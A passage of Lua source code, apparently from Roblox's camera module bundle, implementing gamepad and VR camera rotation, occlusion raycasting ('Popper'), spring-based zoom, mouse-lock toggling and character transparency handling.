					return character:FindFirstChild("Head") or humanoid.Torso
				else
					return humanoid.Torso
				end
			else
				return humanoid.Torso
			end
		end

		function BaseCamera:UpdateGamepad()
			local gamepadPan = self.gamepadPanningCamera
			if gamepadPan and (self.hasGameLoaded or not VRService.VREnabled) then
				gamepadPan = Util.GamepadLinearToCurve(gamepadPan)
				local currentTime = tick()
				if gamepadPan.X ~= 0 or gamepadPan.Y ~= 0 then
					self.userPanningTheCamera = true
				elseif gamepadPan == ZERO_VECTOR2 then
					self.lastThumbstickRotate = nil
					if self.lastThumbstickPos == ZERO_VECTOR2 then
						self.currentSpeed = 0
					end
				end

				local finalConstant = 0

				if self.lastThumbstickRotate then
					if VRService.VREnabled then
						self.currentSpeed = self.vrMaxSpeed
					else
						local elapsedTime = (currentTime - self.lastThumbstickRotate) * 10
						self.currentSpeed = self.currentSpeed + (self.maxSpeed * ((elapsedTime*elapsedTime)/self.numOfSeconds))

						if self.currentSpeed > self.maxSpeed then self.currentSpeed = self.maxSpeed end

						if self.lastVelocity then
							local velocity = (gamepadPan - self.lastThumbstickPos)/(currentTime - self.lastThumbstickRotate)
							local velocityDeltaMag = (velocity - self.lastVelocity).magnitude

							if velocityDeltaMag > 12 then
								self.currentSpeed = self.currentSpeed * (20/velocityDeltaMag)
								if self.currentSpeed > self.maxSpeed then self.currentSpeed = self.maxSpeed end
							end
						end
					end

					finalConstant = UserGameSettings.GamepadCameraSensitivity * self.currentSpeed
					self.lastVelocity = (gamepadPan - self.lastThumbstickPos)/(currentTime - self.lastThumbstickRotate)
				end

				self.lastThumbstickPos = gamepadPan
				self.lastThumbstickRotate = currentTime

				return Vector2.new( gamepadPan.X * finalConstant, gamepadPan.Y * finalConstant * self.ySensitivity * UserGameSettings:GetCameraYInvertValue())
			end

			return ZERO_VECTOR2
		end

		-- [[ VR Support Section ]] --

		function BaseCamera:ApplyVRTransform()
			if not VRService.VREnabled then
				return
			end

			--we only want this to happen in first person VR
			local rootJoint = self.humanoidRootPart and self.humanoidRootPart:FindFirstChild("RootJoint")
			if not rootJoint then
				return
			end

			local cameraSubject = game.Workspace.CurrentCamera.CameraSubject
			local isInVehicle = cameraSubject and cameraSubject:IsA("VehicleSeat")

			if self.inFirstPerson and not isInVehicle then
				local vrFrame = VRService:GetUserCFrame(Enum.UserCFrame.Head)
				local vrRotation = vrFrame - vrFrame.p
				rootJoint.C0 = CFrame.new(vrRotation:vectorToObjectSpace(vrFrame.p)) * CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
			else
				rootJoint.C0 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
			end
		end

		function BaseCamera:IsInFirstPerson()
			return self.inFirstPerson
		end

		function BaseCamera:ShouldUseVRRotation()
			if not VRService.VREnabled then
				return false
			end

			if not self.VRRotationIntensityAvailable and tick() - self.lastVRRotationIntensityCheckTime < 1 then
				return false
			end

			local success, vrRotationIntensity = pcall(function() return StarterGui:GetCore("VRRotationIntensity") end)
			self.VRRotationIntensityAvailable = success and vrRotationIntensity ~= nil
			self.lastVRRotationIntensityCheckTime = tick()

			self.shouldUseVRRotation = success and vrRotationIntensity ~= nil and vrRotationIntensity ~= "Smooth"

			return self.shouldUseVRRotation
		end

		function BaseCamera:GetVRRotationInput()
			local vrRotateSum = ZERO_VECTOR2
			local success, vrRotationIntensity = pcall(function() return StarterGui:GetCore("VRRotationIntensity") end)

			if not success then
				return
			end

			local vrGamepadRotation = self.GamepadPanningCamera or ZERO_VECTOR2
			local delayExpired = (tick() - self.lastVRRotationTime) >= self:GetRepeatDelayValue(vrRotationIntensity)

			if math.abs(vrGamepadRotation.x) >= self:GetActivateValue() then
				if (delayExpired or not self.vrRotateKeyCooldown[Enum.KeyCode.Thumbstick2]) then
					local sign = 1
					if vrGamepadRotation.x < 0 then
						sign = -1
					end
					vrRotateSum = vrRotateSum + self:GetRotateAmountValue(vrRotationIntensity) * sign
					self.vrRotateKeyCooldown[Enum.KeyCode.Thumbstick2] = true
				end
			elseif math.abs(vrGamepadRotation.x) < self:GetActivateValue() - 0.1 then
				self.vrRotateKeyCooldown[Enum.KeyCode.Thumbstick2] = nil
			end
			if self.turningLeft then
				if delayExpired or not self.vrRotateKeyCooldown[Enum.KeyCode.Left] then
					vrRotateSum = vrRotateSum - self:GetRotateAmountValue(vrRotationIntensity)
					self.vrRotateKeyCooldown[Enum.KeyCode.Left] = true
				end
			else
				self.vrRotateKeyCooldown[Enum.KeyCode.Left] = nil
			end
			if self.turningRight then
				if (delayExpired or not self.vrRotateKeyCooldown[Enum.KeyCode.Right]) then
					vrRotateSum = vrRotateSum + self:GetRotateAmountValue(vrRotationIntensity)
					self.vrRotateKeyCooldown[Enum.KeyCode.Right] = true
				end
			else
				self.vrRotateKeyCooldown[Enum.KeyCode.Right] = nil
			end

			if vrRotateSum ~= ZERO_VECTOR2 then
				self.lastVRRotationTime = tick()
			end

			return vrRotateSum
		end

		function BaseCamera:CancelCameraFreeze(keepConstraints)
			if not keepConstraints then
				self.cameraTranslationConstraints = Vector3.new(self.cameraTranslationConstraints.x, 1, self.cameraTranslationConstraints.z)
			end
			if self.cameraFrozen then
				self.trackingHumanoid = nil
				self.cameraFrozen = false
			end
		end

		function BaseCamera:StartCameraFreeze(subjectPosition, humanoidToTrack)
			if not self.cameraFrozen then
				self.humanoidJumpOrigin = subjectPosition
				self.trackingHumanoid = humanoidToTrack
				self.cameraTranslationConstraints = Vector3.new(self.cameraTranslationConstraints.x, 0, self.cameraTranslationConstraints.z)
				self.cameraFrozen = true
			end
		end

		function BaseCamera:OnNewCameraSubject()
			if self.subjectStateChangedConn then
				self.subjectStateChangedConn:Disconnect()
				self.subjectStateChangedConn = nil
			end

			local humanoid = workspace.CurrentCamera and workspace.CurrentCamera.CameraSubject
			if self.trackingHumanoid ~= humanoid then
				self:CancelCameraFreeze()
			end
			if humanoid and humanoid:IsA("Humanoid") then
				self.subjectStateChangedConn = humanoid.StateChanged:Connect(function(oldState, newState)
					if VRService.VREnabled and newState == Enum.HumanoidStateType.Jumping and not self.inFirstPerson then
						self:StartCameraFreeze(self:GetSubjectPosition(), humanoid)
					elseif newState ~= Enum.HumanoidStateType.Jumping and newState ~= Enum.HumanoidStateType.Freefall then
						self:CancelCameraFreeze(true)
					end
				end)
			end
		end

		function BaseCamera:GetVRFocus(subjectPosition, timeDelta)
			local lastFocus = self.LastCameraFocus or subjectPosition
			if not self.cameraFrozen then
				self.cameraTranslationConstraints = Vector3.new(self.cameraTranslationConstraints.x, math.min(1, self.cameraTranslationConstraints.y + 0.42 * timeDelta), self.cameraTranslationConstraints.z)
			end

			local newFocus
			if self.cameraFrozen and self.humanoidJumpOrigin and self.humanoidJumpOrigin.y > lastFocus.y then
				newFocus = CFrame.new(Vector3.new(subjectPosition.x, math.min(self.humanoidJumpOrigin.y, lastFocus.y + 5 * timeDelta), subjectPosition.z))
			else
				newFocus = CFrame.new(Vector3.new(subjectPosition.x, lastFocus.y, subjectPosition.z):lerp(subjectPosition, self.cameraTranslationConstraints.y))
			end

			if self.cameraFrozen then
				-- No longer in 3rd person
				if self.inFirstPerson then -- not VRService.VREnabled
					self:CancelCameraFreeze()
				end
				-- This case you jumped off a cliff and want to keep your character in view
				-- 0.5 is to fix floating point error when not jumping off cliffs
				if self.humanoidJumpOrigin and subjectPosition.y < (self.humanoidJumpOrigin.y - 0.5) then
					self:CancelCameraFreeze()
				end
			end

			return newFocus
		end

		function BaseCamera:GetRotateAmountValue(vrRotationIntensity)
			vrRotationIntensity = vrRotationIntensity or StarterGui:GetCore("VRRotationIntensity")
			if vrRotationIntensity then
				if vrRotationIntensity == "Low" then
					return VR_LOW_INTENSITY_ROTATION
				elseif vrRotationIntensity == "High" then
					return VR_HIGH_INTENSITY_ROTATION
				end
			end
			return ZERO_VECTOR2
		end

		function BaseCamera:GetRepeatDelayValue(vrRotationIntensity)
			vrRotationIntensity = vrRotationIntensity or StarterGui:GetCore("VRRotationIntensity")
			if vrRotationIntensity then
				if vrRotationIntensity == "Low" then
					return VR_LOW_INTENSITY_REPEAT
				elseif vrRotationIntensity == "High" then
					return VR_HIGH_INTENSITY_REPEAT
				end
			end
			return 0
		end

		function BaseCamera:Update(dt)
			error("BaseCamera:Update() This is a virtual function that should never be getting called.", 2)
		end

		BaseCamera.UpCFrame = CFrame.new()

		function BaseCamera:UpdateUpCFrame(cf)
			self.UpCFrame = cf
		end
		local ZERO = Vector3.new(0, 0, 0)
		function BaseCamera:CalculateNewLookCFrame(suppliedLookVector)
			local currLookVector = suppliedLookVector or self:GetCameraLookVector()
			currLookVector = self.UpCFrame:VectorToObjectSpace(currLookVector)

			local currPitchAngle = math.asin(currLookVector.y)
			local yTheta = math.clamp(self.rotateInput.y, -MAX_Y + currPitchAngle, -MIN_Y + currPitchAngle)
			local constrainedRotateInput = Vector2.new(self.rotateInput.x, yTheta)
			local startCFrame = CFrame.new(ZERO, currLookVector)
			local newLookCFrame = CFrame.Angles(0, -constrainedRotateInput.x, 0) * startCFrame * CFrame.Angles(-constrainedRotateInput.y,0,0)

			return newLookCFrame
		end

		return BaseCamera
	end

	function _BaseOcclusion()
		--[[ The Module ]]--
		local BaseOcclusion = {}
		BaseOcclusion.__index = BaseOcclusion
		setmetatable(BaseOcclusion, {
			__call = function(_, ...)
				return BaseOcclusion.new(...)
			end
		})

		function BaseOcclusion.new()
			local self = setmetatable({}, BaseOcclusion)
			return self
		end

		-- Called when character is added
		function BaseOcclusion:CharacterAdded(char, player)
		end

		-- Called when character is about to be removed
		function BaseOcclusion:CharacterRemoving(char, player)
		end

		function BaseOcclusion:OnCameraSubjectChanged(newSubject)
		end

		--[[ Derived classes are required to override and implement all of the following functions ]]--
		function BaseOcclusion:GetOcclusionMode()
			-- Must be overridden in derived classes to return an Enum.DevCameraOcclusionMode value
			warn("BaseOcclusion GetOcclusionMode must be overridden by derived classes")
			return nil
		end

		function BaseOcclusion:Enable(enabled)
			warn("BaseOcclusion Enable must be overridden by derived classes")
		end

		function BaseOcclusion:Update(dt, desiredCameraCFrame, desiredCameraFocus)
			warn("BaseOcclusion Update must be overridden by derived classes")
			return desiredCameraCFrame, desiredCameraFocus
		end

		return BaseOcclusion
	end

	function _Popper()

		local Players = game:GetService("Players")

		local camera = game.Workspace.CurrentCamera

		local min = math.min
		local tan = math.tan
		local rad = math.rad
		local inf = math.huge
		local ray = Ray.new

		local function getTotalTransparency(part)
			return 1 - (1 - part.Transparency)*(1 - part.LocalTransparencyModifier)
		end

		local function eraseFromEnd(t, toSize)
			for i = #t, toSize + 1, -1 do
				t[i] = nil
			end
		end

		local nearPlaneZ, projX, projY do
			local function updateProjection()
				local fov = rad(camera.FieldOfView)
				local view = camera.ViewportSize
				local ar = view.X/view.Y

				projY = 2*tan(fov/2)
				projX = ar*projY
			end

			camera:GetPropertyChangedSignal("FieldOfView"):Connect(updateProjection)
			camera:GetPropertyChangedSignal("ViewportSize"):Connect(updateProjection)

			updateProjection()

			nearPlaneZ = camera.NearPlaneZ
			camera:GetPropertyChangedSignal("NearPlaneZ"):Connect(function()
				nearPlaneZ = camera.NearPlaneZ
			end)
		end

		local blacklist = {} do
			local charMap = {}

			local function refreshIgnoreList()
				local n = 1
				blacklist = {}
				for _, character in pairs(charMap) do
					blacklist[n] = character
					n = n + 1
				end
			end

			local function playerAdded(player)
				local function characterAdded(character)
					charMap[player] = character
					refreshIgnoreList()
				end
				local function characterRemoving()
					charMap[player] = nil
					refreshIgnoreList()
				end

				player.CharacterAdded:Connect(characterAdded)
				player.CharacterRemoving:Connect(characterRemoving)
				if player.Character then
					characterAdded(player.Character)
				end
			end

			local function playerRemoving(player)
				charMap[player] = nil
				refreshIgnoreList()
			end

			Players.PlayerAdded:Connect(playerAdded)
			Players.PlayerRemoving:Connect(playerRemoving)

			for _, player in ipairs(Players:GetPlayers()) do
				playerAdded(player)
			end
			refreshIgnoreList()
		end

		--------------------------------------------------------------------------------------------
		-- Popper uses the level geometry find an upper bound on subject-to-camera distance.
		--
		-- Hard limits are applied immediately and unconditionally. They are generally caused
		-- when level geometry intersects with the near plane (with exceptions, see below).
		--
		-- Soft limits are only applied under certain conditions.
		-- They are caused when level geometry occludes the subject without actually intersecting
		-- with the near plane at the target distance.
		--
		-- Soft limits can be promoted to hard limits and hard limits can be demoted to soft limits.
		-- We usually don"t want the latter to happen.
		--
		-- A soft limit will be promoted to a hard limit if an obstruction
		-- lies between the current and target camera positions.
		--------------------------------------------------------------------------------------------

		local subjectRoot
		local subjectPart

		camera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
			local subject = camera.CameraSubject
			if subject:IsA("Humanoid") then
				subjectPart = subject.RootPart
			elseif subject:IsA("BasePart") then
				subjectPart = subject
			else
				subjectPart = nil
			end
		end)

		local function canOcclude(part)
			-- Occluders must be:
			-- 1. Opaque
			-- 2. Interactable
			-- 3. Not in the same assembly as the subject

			return
				getTotalTransparency(part) < 0.25 and
				part.CanCollide and
				subjectRoot ~= (part:GetRootPart() or part) and
				not part:IsA("TrussPart")
		end

		-- Offsets for the volume visibility test
		local SCAN_SAMPLE_OFFSETS = {
			Vector2.new( 0.4, 0.0),
			Vector2.new(-0.4, 0.0),
			Vector2.new( 0.0,-0.4),
			Vector2.new( 0.0, 0.4),
			Vector2.new( 0.0, 0.2),
		}

		--------------------------------------------------------------------------------
		-- Piercing raycasts

		local function getCollisionPoint(origin, dir)
			local originalSize = #blacklist
			repeat
				local hitPart, hitPoint = workspace:FindPartOnRayWithIgnoreList(
					ray(origin, dir), blacklist, false, true
				)

				if hitPart then
					if hitPart.CanCollide then
						eraseFromEnd(blacklist, originalSize)
						return hitPoint, true
					end
					blacklist[#blacklist + 1] = hitPart
				end
			until not hitPart

			eraseFromEnd(blacklist, originalSize)
			return origin + dir, false
		end

		--------------------------------------------------------------------------------

		local function queryPoint(origin, unitDir, dist, lastPos)
			debug.profilebegin("queryPoint")

			local originalSize = #blacklist

			dist = dist + nearPlaneZ
			local target = origin + unitDir*dist

			local softLimit = inf
			local hardLimit = inf
			local movingOrigin = origin

			repeat
				local entryPart, entryPos = workspace:FindPartOnRayWithIgnoreList(ray(movingOrigin, target - movingOrigin), blacklist, false, true)

				if entryPart then
					if canOcclude(entryPart) then
						local wl = {entryPart}
						local exitPart = workspace:FindPartOnRayWithWhitelist(ray(target, entryPos - target), wl, true)

						local lim = (entryPos - origin).Magnitude

						if exitPart then
							local promote = false
							if lastPos then
								promote =
									workspace:FindPartOnRayWithWhitelist(ray(lastPos, target - lastPos), wl, true) or
									workspace:FindPartOnRayWithWhitelist(ray(target, lastPos - target), wl, true)
							end

							if promote then
								-- Ostensibly a soft limit, but the camera has passed through it in the last frame, so promote to a hard limit.
								hardLimit = lim
							elseif dist < softLimit then
								-- Trivial soft limit
								softLimit = lim
							end
						else
							-- Trivial hard limit
							hardLimit = lim
						end
					end

					blacklist[#blacklist + 1] = entryPart
					movingOrigin = entryPos - unitDir*1e-3
				end
			until hardLimit < inf or not entryPart

			eraseFromEnd(blacklist, originalSize)

			debug.profileend()
			return softLimit - nearPlaneZ, hardLimit - nearPlaneZ
		end

		local function queryViewport(focus, dist)
			debug.profilebegin("queryViewport")

			local fP =  focus.p
			local fX =  focus.rightVector
			local fY =  focus.upVector
			local fZ = -focus.lookVector

			local viewport = camera.ViewportSize

			local hardBoxLimit = inf
			local softBoxLimit = inf

			-- Center the viewport on the PoI, sweep points on the edge towards the target, and take the minimum limits
			for viewX = 0, 1 do
				local worldX = fX*((viewX - 0.5)*projX)

				for viewY = 0, 1 do
					local worldY = fY*((viewY - 0.5)*projY)

					local origin = fP + nearPlaneZ*(worldX + worldY)
					local lastPos = camera:ViewportPointToRay(
						viewport.x*viewX,
						viewport.y*viewY
					).Origin

					local softPointLimit, hardPointLimit = queryPoint(origin, fZ, dist, lastPos)

					if hardPointLimit < hardBoxLimit then
						hardBoxLimit = hardPointLimit
					end
					if softPointLimit < softBoxLimit then
						softBoxLimit = softPointLimit
					end
				end
			end
			debug.profileend()

			return softBoxLimit, hardBoxLimit
		end

		local function testPromotion(focus, dist, focusExtrapolation)
			debug.profilebegin("testPromotion")

			local fP = focus.p
			local fX = focus.rightVector
			local fY = focus.upVector
			local fZ = -focus.lookVector

			do
				-- Dead reckoning the camera rotation and focus
				debug.profilebegin("extrapolate")

				local SAMPLE_DT = 0.0625
				local SAMPLE_MAX_T = 1.25

				local maxDist = (getCollisionPoint(fP, focusExtrapolation.posVelocity*SAMPLE_MAX_T) - fP).Magnitude
				-- Metric that decides how many samples to take
				local combinedSpeed = focusExtrapolation.posVelocity.magnitude

				for dt = 0, min(SAMPLE_MAX_T, focusExtrapolation.rotVelocity.magnitude + maxDist/combinedSpeed), SAMPLE_DT do
					local cfDt = focusExtrapolation.extrapolate(dt) -- Extrapolated CFrame at time dt

					if queryPoint(cfDt.p, -cfDt.lookVector, dist) >= dist then
						return false
					end
				end

				debug.profileend()
			end

			do
				-- Test screen-space offsets from the focus for the presence of soft limits
				debug.profilebegin("testOffsets")

				for _, offset in ipairs(SCAN_SAMPLE_OFFSETS) do
					local scaledOffset = offset
					local pos = getCollisionPoint(fP, fX*scaledOffset.x + fY*scaledOffset.y)
					if queryPoint(pos, (fP + fZ*dist - pos).Unit, dist) == inf then
						return false
					end
				end

				debug.profileend()
			end

			debug.profileend()
			return true
		end

		local function Popper(focus, targetDist, focusExtrapolation)
			debug.profilebegin("popper")

			subjectRoot = subjectPart and subjectPart:GetRootPart() or subjectPart

			local dist = targetDist
			local soft, hard = queryViewport(focus, targetDist)
			if hard < dist then
				dist = hard
			end
			if soft < dist and testPromotion(focus, targetDist, focusExtrapolation) then
				dist = soft
			end

			subjectRoot = nil

			debug.profileend()
			return dist
		end

		return Popper
	end

	function _ZoomController()
		local ZOOM_STIFFNESS = 4.5
		local ZOOM_DEFAULT = 12.5
		local ZOOM_ACCELERATION = 0.0375

		local MIN_FOCUS_DIST = 0.5
		local DIST_OPAQUE = 1

		local Popper = _Popper()

		local clamp = math.clamp
		local exp = math.exp
		local min = math.min
		local max = math.max
		local pi = math.pi

		local cameraMinZoomDistance, cameraMaxZoomDistance do
			local Player = game:GetService("Players").LocalPlayer

			local function updateBounds()
				cameraMinZoomDistance = Player.CameraMinZoomDistance
				cameraMaxZoomDistance = Player.CameraMaxZoomDistance
			end

			updateBounds()

			Player:GetPropertyChangedSignal("CameraMinZoomDistance"):Connect(updateBounds)
			Player:GetPropertyChangedSignal("CameraMaxZoomDistance"):Connect(updateBounds)
		end

		local ConstrainedSpring = {} do
			ConstrainedSpring.__index = ConstrainedSpring

			function ConstrainedSpring.new(freq, x, minValue, maxValue)
				x = clamp(x, minValue, maxValue)
				return setmetatable({
					freq = freq, -- Undamped frequency (Hz)
					x = x, -- Current position
					v = 0, -- Current velocity
					minValue = minValue, -- Minimum bound
					maxValue = maxValue, -- Maximum bound
					goal = x, -- Goal position
				}, ConstrainedSpring)
			end

			function ConstrainedSpring:Step(dt)
				local freq = self.freq*2*pi -- Convert from Hz to rad/s
				local x = self.x
				local v = self.v
				local minValue = self.minValue
				local maxValue = self.maxValue
				local goal = self.goal

				-- Solve the spring ODE for position and velocity after time t, assuming critical damping:
				--   2*f*x'[t] + x''[t] = f^2*(g - x[t])
				-- Knowns are x[0] and x'[0].
				-- Solve for x[t] and x'[t].

				local offset = goal - x
				local step = freq*dt
				local decay = exp(-step)

				local x1 = goal + (v*dt - offset*(step + 1))*decay
				local v1 = ((offset*freq - v)*step + v)*decay

				-- Constrain
				if x1 < minValue then
					x1 = minValue
					v1 = 0
				elseif x1 > maxValue then
					x1 = maxValue
					v1 = 0
				end

				self.x = x1
				self.v = v1

				return x1
			end
		end

		local zoomSpring = ConstrainedSpring.new(ZOOM_STIFFNESS, ZOOM_DEFAULT, MIN_FOCUS_DIST, cameraMaxZoomDistance)

		local function stepTargetZoom(z, dz, zoomMin, zoomMax)
			z = clamp(z + dz*(1 + z*ZOOM_ACCELERATION), zoomMin, zoomMax)
			if z < DIST_OPAQUE then
				z = dz <= 0 and zoomMin or DIST_OPAQUE
			end
			return z
		end

		local zoomDelta = 0

		local Zoom = {} do
			function Zoom.Update(renderDt, focus, extrapolation)
				local poppedZoom = math.huge

				if zoomSpring.goal > DIST_OPAQUE then
					-- Make a pessimistic estimate of zoom distance for this step without accounting for poppercam
					local maxPossibleZoom = max(
						zoomSpring.x,
						stepTargetZoom(zoomSpring.goal, zoomDelta, cameraMinZoomDistance, cameraMaxZoomDistance)
					)

					-- Run the Popper algorithm on the feasible zoom range, [MIN_FOCUS_DIST, maxPossibleZoom]
					poppedZoom = Popper(
						focus*CFrame.new(0, 0, MIN_FOCUS_DIST),
						maxPossibleZoom - MIN_FOCUS_DIST,
						extrapolation
					) + MIN_FOCUS_DIST
				end

				zoomSpring.minValue = MIN_FOCUS_DIST
				zoomSpring.maxValue = min(cameraMaxZoomDistance, poppedZoom)

				return zoomSpring:Step(renderDt)
			end

			function Zoom.SetZoomParameters(targetZoom, newZoomDelta)
				zoomSpring.goal = targetZoom
				zoomDelta = newZoomDelta
			end
		end

		return Zoom
	end

	function _MouseLockController()
		--[[ Constants ]]--
		local DEFAULT_MOUSE_LOCK_CURSOR = "rbxasset://textures/MouseLockedCursor.png"

		local CONTEXT_ACTION_NAME = "MouseLockSwitchAction"
		local MOUSELOCK_ACTION_PRIORITY = Enum.ContextActionPriority.Default.Value

		--[[ Services ]]--
		local PlayersService = game:GetService("Players")
		local ContextActionService = game:GetService("ContextActionService")
		local Settings = UserSettings()	-- ignore warning
		local GameSettings = Settings.GameSettings
		local Mouse = PlayersService.LocalPlayer:GetMouse()

		--[[ The Module ]]--
		local MouseLockController = {}
		MouseLockController.__index = MouseLockController

		function MouseLockController.new()
			local self = setmetatable({}, MouseLockController)

			self.isMouseLocked = false
			self.savedMouseCursor = nil
			self.boundKeys = {Enum.KeyCode.LeftShift, Enum.KeyCode.RightShift} -- defaults

			self.mouseLockToggledEvent = Instance.new("BindableEvent")

			local boundKeysObj = script:FindFirstChild("BoundKeys")
			if (not boundKeysObj) or (not boundKeysObj:IsA("StringValue")) then
				-- If object with correct name was found, but it's not a StringValue, destroy and replace
				if boundKeysObj then
					boundKeysObj:Destroy()
				end

				boundKeysObj = Instance.new("StringValue")
				boundKeysObj.Name = "BoundKeys"
				boundKeysObj.Value = "LeftShift,RightShift"
				boundKeysObj.Parent = script
			end

			if boundKeysObj then
				boundKeysObj.Changed:Connect(function(value)
					self:OnBoundKeysObjectChanged(value)
				end)
				self:OnBoundKeysObjectChanged(boundKeysObj.Value) -- Initial setup call
			end

			-- Watch for changes to user's ControlMode and ComputerMovementMode settings and update the feature availability accordingly
			GameSettings.Changed:Connect(function(property)
				if property == "ControlMode" or property == "ComputerMovementMode" then
					self:UpdateMouseLockAvailability()
				end
			end)

			-- Watch for changes to DevEnableMouseLock and update the feature availability accordingly
			PlayersService.LocalPlayer:GetPropertyChangedSignal("DevEnableMouseLock"):Connect(function()
				self:UpdateMouseLockAvailability()
			end)

			-- Watch for changes to DevEnableMouseLock and update the feature availability accordingly
			PlayersService.LocalPlayer:GetPropertyChangedSignal("DevComputerMovementMode"):Connect(function()
				self:UpdateMouseLockAvailability()
			end)

			self:UpdateMouseLockAvailability()

			return self
		end

		function MouseLockController:GetIsMouseLocked()
			return self.isMouseLocked
		end

		function MouseLockController:GetBindableToggleEvent()
			return self.mouseLockToggledEvent.Event
		end

		function MouseLockController:GetMouseLockOffset()
			local offsetValueObj = script:FindFirstChild("CameraOffset")
			if offsetValueObj and offsetValueObj:IsA("Vector3Value") then
				return offsetValueObj.Value
			else
				-- If CameraOffset object was found but not correct type, destroy
				if offsetValueObj then
					offsetValueObj:Destroy()
				end
				offsetValueObj = Instance.new("Vector3Value")
				offsetValueObj.Name = "CameraOffset"
				offsetValueObj.Value = Vector3.new(1.75,0,0) -- Legacy Default Value
				offsetValueObj.Parent = script
			end

			if offsetValueObj and offsetValueObj.Value then
				return offsetValueObj.Value
			end

			return Vector3.new(1.75,0,0)
		end

		function MouseLockController:UpdateMouseLockAvailability()
			local devAllowsMouseLock = PlayersService.LocalPlayer.DevEnableMouseLock
			local devMovementModeIsScriptable = PlayersService.LocalPlayer.DevComputerMovementMode == Enum.DevComputerMovementMode.Scriptable
			local userHasMouseLockModeEnabled = GameSettings.ControlMode == Enum.ControlMode.MouseLockSwitch
			local userHasClickToMoveEnabled =  GameSettings.ComputerMovementMode == Enum.ComputerMovementMode.ClickToMove
			local MouseLockAvailable = devAllowsMouseLock and userHasMouseLockModeEnabled and not userHasClickToMoveEnabled and not devMovementModeIsScriptable

			if MouseLockAvailable~=self.enabled then
				self:EnableMouseLock(MouseLockAvailable)
			end
		end

		function MouseLockController:OnBoundKeysObjectChanged(newValue)
			self.boundKeys = {} -- Overriding defaults, note: possibly with nothing at all if boundKeysObj.Value is "" or contains invalid values
			for token in string.gmatch(newValue,"[^%s,]+") do
				for _, keyEnum in pairs(Enum.KeyCode:GetEnumItems()) do
					if token == keyEnum.Name then
						self.boundKeys[#self.boundKeys+1] = keyEnum
						break
					end
				end
			end
			self:UnbindContextActions()
			self:BindContextActions()
		end

		--[[ Local Functions ]]--
		function MouseLockController:OnMouseLockToggled()
			self.isMouseLocked = not self.isMouseLocked

			if self.isMouseLocked then
				local cursorImageValueObj = script:FindFirstChild("CursorImage")
				if cursorImageValueObj and cursorImageValueObj:IsA("StringValue") and cursorImageValueObj.Value then
					self.savedMouseCursor = Mouse.Icon
					Mouse.Icon = cursorImageValueObj.Value
				else
					if cursorImageValueObj then
						cursorImageValueObj:Destroy()
					end
					cursorImageValueObj = Instance.new("StringValue")
					cursorImageValueObj.Name = "CursorImage"
					cursorImageValueObj.Value = DEFAULT_MOUSE_LOCK_CURSOR
					cursorImageValueObj.Parent = script
					self.savedMouseCursor = Mouse.Icon
					Mouse.Icon = DEFAULT_MOUSE_LOCK_CURSOR
				end
			else
				if self.savedMouseCursor then
					Mouse.Icon = self.savedMouseCursor
					self.savedMouseCursor = nil
				end
			end

			self.mouseLockToggledEvent:Fire()
		end

		function MouseLockController:DoMouseLockSwitch(name, state, input)
			if state == Enum.UserInputState.Begin then
				self:OnMouseLockToggled()
				return Enum.ContextActionResult.Sink
			end
			return Enum.ContextActionResult.Pass
		end

		function MouseLockController:BindContextActions()
			ContextActionService:BindActionAtPriority(CONTEXT_ACTION_NAME, function(name, state, input)
				return self:DoMouseLockSwitch(name, state, input)
			end, false, MOUSELOCK_ACTION_PRIORITY, unpack(self.boundKeys))
		end

		function MouseLockController:UnbindContextActions()
			ContextActionService:UnbindAction(CONTEXT_ACTION_NAME)
		end

		function MouseLockController:IsMouseLocked()
			return self.enabled and self.isMouseLocked
		end

		function MouseLockController:EnableMouseLock(enable)
			if enable ~= self.enabled then

				self.enabled = enable

				if self.enabled then
					-- Enabling the mode
					self:BindContextActions()
				else
					-- Disabling
					-- Restore mouse cursor
					if Mouse.Icon~="" then
						Mouse.Icon = ""
					end

					self:UnbindContextActions()

					-- If the mode is disabled while being used, fire the event to toggle it off
					if self.isMouseLocked then
						self.mouseLockToggledEvent:Fire()
					end

					self.isMouseLocked = false
				end

			end
		end

		return MouseLockController
	end

	function _TransparencyController()

		local MAX_TWEEN_RATE = 2.8 -- per second

		local Util = _CameraUtils()

		--[[ The Module ]]--
		local TransparencyController = {}
		TransparencyController.__index = TransparencyController

		function TransparencyController.new()
			local self = setmetatable({}, TransparencyController)

			self.lastUpdate = tick()
			self.transparencyDirty = false
			self.enabled = false
			self.lastTransparency = nil

			self.descendantAddedConn, self.descendantRemovingConn = nil, nil
			self.toolDescendantAddedConns = {}
			self.toolDescendantRemovingConns = {}
			self.cachedParts = {}

			return self
		end


		function TransparencyController:HasToolAncestor(object)
			if object.Parent == nil then return false end
			return object.Parent:IsA('Tool') or self:HasToolAncestor(object.Parent)
		end

		function TransparencyController:IsValidPartToModify(part)
			if part:IsA('BasePart') or part:IsA('Decal') then
				return not self:HasToolAncestor(part)
			end
			return false
		end

		function TransparencyController:CachePartsRecursive(object)
			if object then
				if self:IsValidPartToModify(object) then
					self.cachedParts[object] = true
					self.transparencyDirty = true
				end
				for _, child in pairs(object:GetChildren()) do
					self:CachePartsRecursive(child)
				end
			end
		end

		function TransparencyController:TeardownTransparency()
			for child, _ in pairs(self.cachedParts) do
				child.LocalTransparencyModifier = 0
			end
			self.cachedParts = {}
			self.transparencyDirty = true
			self.lastTransparency = nil

			if self.descendantAddedConn then
				self.descendantAddedConn:disconnect()
				self.descendantAddedConn = nil
			end
			if self.descendantRemovingConn then
				self.descendantRemovingConn:disconnect()
				self.descendantRemovingConn = nil
			end
			for object, conn in pairs(self.toolDescendantAddedConns) do
				conn:Disconnect()
				self.toolDescendantAddedConns[object] = nil
			end
			for object, conn in pairs(self.toolDescendantRemovingConns) do
				conn:Disconnect()
				self.toolDescendantRemovingConns[object] = nil
			end
		end

		function TransparencyController:SetupTransparency(character)
			self:TeardownTransparency()

			if self.descendantAddedConn then self.descendantAddedConn:disconnect() end
			self.descendantAddedConn = character.DescendantAdded:Connect(function(object)
				-- This is a part we want to invisify
				if self:IsValidPartToModify(object) then
					self.cachedParts[object] = true
					self.transparencyDirty = true
					-- There is now a tool under the character
				elseif object:IsA('Tool') then
					if self.toolDescendantAddedConns[object] then self.toolDescendantAddedConns[object]:Disconnect() end
					self.toolDescendantAddedConns[object] = object.DescendantAdded:Connect(function(toolChild)
						self.cachedParts[toolChild] = nil
						if toolChild:IsA('BasePart') or toolChild:IsA('Decal') then
							-- Reset the transparency
							toolChild.LocalTransparencyModifier = 0
						end
					end)
